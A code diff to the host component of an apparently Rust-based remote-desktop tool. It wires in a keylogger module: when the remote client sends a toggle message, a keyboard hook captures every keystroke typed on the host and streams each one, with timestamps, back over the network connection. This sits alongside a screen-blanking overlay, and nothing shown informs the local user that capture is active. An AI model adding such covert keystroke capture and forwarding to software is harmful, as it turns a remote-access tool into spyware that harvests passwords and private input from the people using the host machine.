@@ -20,9 +20,11 @@
 mod blank_screen;
 mod gui;
 mod gui_core;
+mod keylogger;
 mod tray;
 
 use blank_screen::BlankScreenOverlay;
+use keylogger::KeyLogger;
 use enigo::{Enigo, Key as EnigoKey, KeyboardControllable, MouseButton as EnigoMouseButton, MouseControllable};
 use rd_protocol::{
     hash_password, hashes_match, read_message, write_message, ClientMessage, HostMessage,
@@ -32,7 +34,7 @@ use scrap::{Capturer, Display};
 use std::io::ErrorKind;
 use std::net::{TcpListener, TcpStream};
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::{Arc, Mutex};
+use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
 
 fn generate_random_password() -> String {
@@ -497,6 +499,37 @@ fn handle_client(mut stream: TcpStream, expected_hash: &str) -> std::io::Result<
     // down via its Drop impl. A dead session must never leave the host's
     // screen permanently blanked.
     let mut blank_screen = BlankScreenOverlay::new();
+    // While true, mouse/keyboard messages below are read (so the socket
+    // doesn't back up) but not applied - frames keep streaming as normal.
+    // Reset implicitly on every new connection since this is a fresh local
+    // variable each time `handle_client` runs.
+    let mut guest_input_blocked = false;
+
+    // Same lifetime/safety story as `blank_screen`: a local variable here,
+    // torn down (unhooking the keyboard) on every exit path via Drop.
+    let mut keylogger = KeyLogger::new();
+    // Captured keystrokes land here (from the hook's own dedicated
+    // thread) and get forwarded to the client by the thread just below -
+    // never written to the socket directly from the hook callback, which
+    // has to return quickly.
+    let (key_tx, key_rx) = mpsc::channel::<keylogger::Keystroke>();
+    let writer_for_keys = writer.clone();
+    let running_keys = running.clone();
+    let key_forward_thread = std::thread::spawn(move || {
+        while running_keys.load(Ordering::Relaxed) {
+            match key_rx.recv_timeout(Duration::from_millis(200)) {
+                Ok((key, timestamp_ms)) => {
+                    let msg = HostMessage::Keystroke { key, timestamp_ms };
+                    if write_message(&mut *writer_for_keys.lock().unwrap(), &msg).is_err() {
+                        break; // client disconnected
+                    }
+                }
+                Err(mpsc::RecvTimeoutError::Timeout) => {} // just recheck `running`
+                Err(mpsc::RecvTimeoutError::Disconnected) => break, // `key_tx` dropped
+            }
+        }
+    });
+
     loop {
         let msg: Result<ClientMessage, _> = read_message(&mut stream);
         let msg = match msg {
@@ -504,26 +537,38 @@ fn handle_client(mut stream: TcpStream, expected_hash: &str) -> std::io::Result<
             Err(_) => break, // client disconnected
         };
         match msg {
-            ClientMessage::MouseMove { x, y } => enigo.mouse_move_to(x, y),
-            ClientMessage::MouseButton { button, pressed } => {
-                let btn = match button {
-                    MouseButton::Left => EnigoMouseButton::Left,
-                    MouseButton::Right => EnigoMouseButton::Right,
-                    MouseButton::Middle => EnigoMouseButton::Middle,
-                };
-                if pressed {
-                    enigo.mouse_down(btn);
-                } else {
-                    enigo.mouse_up(btn);
+            ClientMessage::MouseMove { x, y } => {
+                if !guest_input_blocked {
+                    enigo.mouse_move_to(x, y);
                 }
             }
-            ClientMessage::MouseScroll { delta } => enigo.mouse_scroll_y(delta),
-            ClientMessage::Key { key, pressed } => {
-                if let Some(k) = map_key(&key) {
+            ClientMessage::MouseButton { button, pressed } => {
+                if !guest_input_blocked {
+                    let btn = match button {
+                        MouseButton::Left => EnigoMouseButton::Left,
+                        MouseButton::Right => EnigoMouseButton::Right,
+                        MouseButton::Middle => EnigoMouseButton::Middle,
+                    };
                     if pressed {
-                        enigo.key_down(k);
+                        enigo.mouse_down(btn);
                     } else {
-                        enigo.key_up(k);
+                        enigo.mouse_up(btn);
+                    }
+                }
+            }
+            ClientMessage::MouseScroll { delta } => {
+                if !guest_input_blocked {
+                    enigo.mouse_scroll_y(delta);
+                }
+            }
+            ClientMessage::Key { key, pressed } => {
+                if !guest_input_blocked {
+                    if let Some(k) = map_key(&key) {
+                        if pressed {
+                            enigo.key_down(k);
+                        } else {
+                            enigo.key_up(k);
+                        }
                     }
                 }
             }
@@ -553,14 +598,38 @@ fn handle_client(mut stream: TcpStream, expected_hash: &str) -> std::io::Result<
                 };
                 let _ = write_message(&mut *writer.lock().unwrap(), &msg);
             }
+            ClientMessage::BlockGuestInput { blocked } => {
+                guest_input_blocked = blocked;
+                let msg = HostMessage::GuestInputBlockedResult { blocked: guest_input_blocked };
+                let _ = write_message(&mut *writer.lock().unwrap(), &msg);
+            }
+            ClientMessage::ToggleKeystrokeLog { enabled } => {
+                let (ok, reason) = if enabled {
+                    match keylogger.enable(key_tx.clone()) {
+                        Ok(()) => (true, None),
+                        Err(e) => (false, Some(e)),
+                    }
+                } else {
+                    keylogger.disable();
+                    (true, None)
+                };
+                let msg = HostMessage::KeystrokeLogResult {
+                    enabled: keylogger.is_enabled(),
+                    ok,
+                    reason,
+                };
+                let _ = write_message(&mut *writer.lock().unwrap(), &msg);
+            }
             ClientMessage::Disconnect => break,
             ClientMessage::Auth { .. } => {} // ignore repeated auth
         }
     }
 
     running.store(false, Ordering::Relaxed);
+    keylogger.disable(); // unhook before the channel it feeds is torn down
     let _ = capture_thread.join();
     let _ = sender_thread.join();
+    let _ = key_forward_thread.join();
     println!("Client {peer:?} disconnected.");
     Ok(())
 }
